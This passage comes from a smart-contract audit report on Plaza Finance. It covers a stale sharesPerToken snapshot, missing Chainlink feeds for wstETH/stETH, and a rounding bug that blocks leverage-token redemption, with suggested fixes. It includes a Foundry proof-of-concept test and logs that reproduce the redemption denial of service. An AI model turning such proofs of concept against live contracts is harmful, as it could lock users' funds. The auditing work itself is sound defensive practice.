    IndexedUserAssets memory userPool = userAssets[user];
    uint256 shares = userPool.indexedAmountShares;

    for (uint256 i = userPool.lastUpdatedPeriod; i < period; i++) {
      shares += (balance * globalPool.previousPoolAmounts[i].sharesPerToken).toBaseUnit(SHARES_DECIMALS);
    }

    return shares;
  }
```

## Internal Pre-Conditions

The state variable `sharesPerToken` of the pool has been modified.

## External Pre-Conditions


## Attack Path


## Impact

The calculation of coupon tokens that bondholders can claim will be incorrect, potentially leading to financial discrepancies.

## Mitigation

Update the `increaseIndexedAssetPeriod()` function to use the current value of `sharesPerToken` instead of `globalPool.sharesPerToken`.

```diff
  function increaseIndexedAssetPeriod(uint256 sharesPerToken) public onlyRole(DISTRIBUTOR_ROLE) whenNotPaused() {
    globalPool.previousPoolAmounts.push(
      PoolAmount({
        period: globalPool.currentPeriod,
        amount: totalSupply(),
-       sharesPerToken: globalPool.sharesPerToken
+       sharesPerToken: sharesPerToken
      })
    );
    globalPool.currentPeriod++;
    globalPool.sharesPerToken = sharesPerToken;

    emit IncreasedAssetPeriod(globalPool.currentPeriod, sharesPerToken);
  }
```


## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/161




# Issue M-18: Missing Chainlink Price Feeds for wstETH/USD and stETH/USD in BalancerOracleAdapter.sol 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/981 

The protocol has acknowledged this issue.

## Found by 
056Security, 0rpse, 0xAadi, 0xShahilHussain, 0xadrii, Adotsam, Aymen0909, KiroBrejka, noromeb, pashap9990, sl1, solidityenj0yer, whitehat777, x0lohaclohell

### Summary

The BalancerOracleAdapter.sol contract relies on Chainlink price feeds to calculate the prices of tokens used in a Balancer pool to determine the reserveToken. However, the Chainlink price feed aggregators for wstETH/USD and stETH/USD do not exist. When these tokens are included in the Balancer pool, calls to latestRoundData() will revert, as the price feeds are unavailable.

### Root Cause

https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/BalancerOracleAdapter.sol#L109

In the latestRoundData() function, the contract attempts to fetch prices for each token in the pool via Chainlink price feeds:

For tokens like wstETH and stETH, the contract expects a price feed in the form of wstETH/USD or stETH/USD. However, Chainlink does not provide such price feeds. As a result, any attempt to calculate prices for these tokens will fail, causing the contract to revert.


```javascript
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        .
        .
        .
        for(uint8 i = 0; i < tokens.length; i++) {
            oracleDecimals = getOracleDecimals(address(tokens[i]), USD);
@>          prices[i] = getOraclePrice(address(tokens[i]), USD).normalizeAmount(oracleDecimals, decimals);
        }
        .
        .
        .
    }
```

### Internal Pre-conditions

The Balancer pool contains wstETH or stETH as part of the tokens.

### External Pre-conditions

	The protocol or user queries the latestRoundData() function to fetch the price of tokens in the pool.

### Attack Path

_No response_

### Impact

	If wstETH or stETH tokens are part of the Balancer pool, the latestRoundData() function will always revert.

### PoC

_No response_

### Mitigation

_No response_

# Issue M-19: Low TVL and high Leverage Supply will DoS the redeem of Leverage tokens 

Source: https://github.com/sherlock-audit/2024-12-plaza-finance-judging/issues/1039 

## Found by 
0xc0ffEE, 0xe4669da, CL001, Goran, KupiaSec, dobrevaleri, elvin.a.block, future, zxriptor

### Summary

Low TVL and high Leverage Supply might lead to DoS of the Leverage tokens redemption, due to underflow.

### Root Cause

In [getRedeemAmount](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L477), there is multiplication after division, which might lead to underflow. ([ref](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L514)).

This can happen when the `assetSupply` is higher than the `tvl * PRESICION`. 

### Internal Pre-conditions

1. There should be high Leverage Supply
2. The Bond supply and the TVL should be just enough, so that the collateral level is above 1.2.

### External Pre-conditions

_No response_

### Attack Path

1. User redeem any number of Leverage Tokens.

### Impact

User will be unable to redeem his Leverage tokens.

### PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";

import {Pool} from "src/Pool.sol";
import {Token} from "test/mocks/Token.sol";
import {Utils} from "src/lib/Utils.sol";
import {Auction} from "src/Auction.sol";
import {BondToken} from "src/BondToken.sol";
import {PoolFactory} from "src/PoolFactory.sol";
import {Distributor} from "src/Distributor.sol";
import {OracleFeeds} from "src/OracleFeeds.sol";
import {LeverageToken} from "src/LeverageToken.sol";
import {Deployer} from "src/utils/Deployer.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import {PausableUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol";
import {MockPriceFeed} from "test/mocks/MockPriceFeed.sol";

contract PoolPoC is Test {
    error ZeroLeverageSupply();

    Pool pool;
    Token reserve;
    BondToken bond;
    LeverageToken lev;

    address governance = address(0x1);
    address user = address(0x2);

    uint256 constant RESERVE_AMOUNT = 13 ether;

    uint256 private constant CHAINLINK_DECIMAL_PRECISION = 10 ** 8;
    uint8 private constant CHAINLINK_DECIMAL = 8;

    function setUp() public {
        vm.startPrank(governance);
        address deployer = address(new Deployer());
        address oracleFeeds = address(new OracleFeeds());

        address poolBeacon = address(new UpgradeableBeacon(address(new Pool()), governance));
        address bondBeacon = address(new UpgradeableBeacon(address(new BondToken()), governance));
        address levBeacon = address(new UpgradeableBeacon(address(new LeverageToken()), governance));
        address distributorBeacon = address(new UpgradeableBeacon(address(new Distributor()), governance));

        reserve = new Token("Balancer Pool Token", "balancerPoolToken", false);
        Token coupon = new Token("Coupon Token", "couponToken", false);

        // Deploy a mock price feed for the reserve token
        MockPriceFeed mockPriceFeed = new MockPriceFeed();
        mockPriceFeed.setMockPrice(100 * int256(CHAINLINK_DECIMAL_PRECISION), uint8(CHAINLINK_DECIMAL));

        // Set the price feed for the reserve token
        OracleFeeds(oracleFeeds).setPriceFeed(address(reserve), address(0), address(mockPriceFeed), 1 days);

        // Deploy the pool factory
        PoolFactory poolFactory = PoolFactory(
            Utils.deploy(
                address(new PoolFactory()),
                abi.encodeCall(
                    PoolFactory.initialize,
                    (governance, deployer, oracleFeeds, poolBeacon, bondBeacon, levBeacon, distributorBeacon)
                )
            )
        );

        // Prepare the pool parameters
        PoolFactory.PoolParams memory params;
        params.fee = 0;
        params.reserveToken = address(reserve);
        params.sharesPerToken = 2500000;
        params.distributionPeriod = 90 days;
        params.couponToken = address(coupon);

        poolFactory.grantRole(poolFactory.GOV_ROLE(), governance);
        poolFactory.grantRole(poolFactory.POOL_ROLE(), governance);

        // Mint enough tokens for the pool deployment
        reserve.mint(governance, RESERVE_AMOUNT);
        reserve.approve(address(poolFactory), RESERVE_AMOUNT);

        pool = Pool(
            poolFactory.createPool(
                params,
                RESERVE_AMOUNT,
                10 * 10 ** 18,
                1000 * 10 ** 18,
                "Bond ETH",
                "bondETH",
                "Leverage ETH",
                "levETH",
                false
            )
        );

        bond = pool.bondToken();
        lev = pool.lToken();

        vm.stopPrank();
    }
    function testLowTvlAndLowBondTokenSupplyWillBlockLevTokenRedemption() public {
        // The Bond and Leverage tokens are minted to the governance, because the pool is deployed by this address
        // Using governance we bypass the need to have PreDeposit contract, which deploys the pool
        // The tokens from governance are sent to the user, simulating the PreDeposit claim functionality
        console.log("Governance lev balance: ", lev.balanceOf(governance));

        vm.startPrank(governance);
        lev.transfer(user, lev.balanceOf(governance));
        vm.stopPrank();

        console.log("User lev balance: ", lev.balanceOf(user));
        console.log("Governance lev balance: ", lev.balanceOf(governance));

        vm.startPrank(user);
        uint256 amountLev = lev.balanceOf(user);
        vm.expectRevert(Pool.ZeroAmount.selector);
        pool.redeem(Pool.TokenType.LEVERAGE, amountLev, 0);
        console.log("User lev balance after redeem: ", lev.balanceOf(user));
        console.log("Pool reserve tokens: ", reserve.balanceOf(address(pool)));

        vm.stopPrank();
    }
}
```

Logs:
```logs
 Governance lev balance:  1000000000000000000000
 User lev balance:  1000000000000000000000
 Governance lev balance:  0
 User lev balance after redeem:  1000000000000000000000
  Pool reserve tokens:  13000000000000000000
```

### Mitigation

```diff
if (collateralLevel <= COLLATERAL_THRESHOLD) {
      redeemRate = ((tvl * multiplier) / assetSupply);
    } else if (tokenType == TokenType.LEVERAGE) {
-      redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION;
+  redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) * PRECISION / assetSupply) ;
    } else {
      redeemRate = BOND_TARGET_PRICE * PRECISION;
    }

    if (marketRate != 0 && marketRate < redeemRate) {
      redeemRate = marketRate;
    }
```

## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Convexity-Research/plaza-evm/pull/159




